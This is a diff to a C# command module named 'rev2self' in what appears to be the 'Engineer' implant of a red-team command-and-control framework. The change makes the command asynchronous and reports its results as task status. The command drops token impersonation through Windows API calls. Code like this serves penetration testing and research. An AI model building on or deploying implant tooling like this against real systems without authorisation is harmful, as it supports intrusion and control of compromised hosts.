@@ -5,6 +5,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using Engineer.Extra;
+using Engineer.Functions;
 using Engineer.Models;
 
 namespace Engineer.Commands
@@ -13,17 +14,18 @@ namespace Engineer.Commands
     {
         public override string Name => "rev2self";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             {
                 if (WinAPIs.Advapi.RevertToSelf())
                 {
                     WinAPIs.Advapi.OpenProcessToken(Process.GetCurrentProcess().Handle, WinAPIs.Advapi.TOKEN_ALL_ACCESS, out var htest);
                     string result = $" process handle is: {htest}\n" + "Dropped impersonation, reverted to previous user";
-                    
-                    return result;
+
+                    Tasking.FillTaskResults(result,task,EngTaskStatus.Complete);
+                    return;
                 }
-                return "error: " + "Failed to drop token";
+                Tasking.FillTaskResults("error: " + "Failed to drop token", task, EngTaskStatus.Failed);
             }
         }
     }
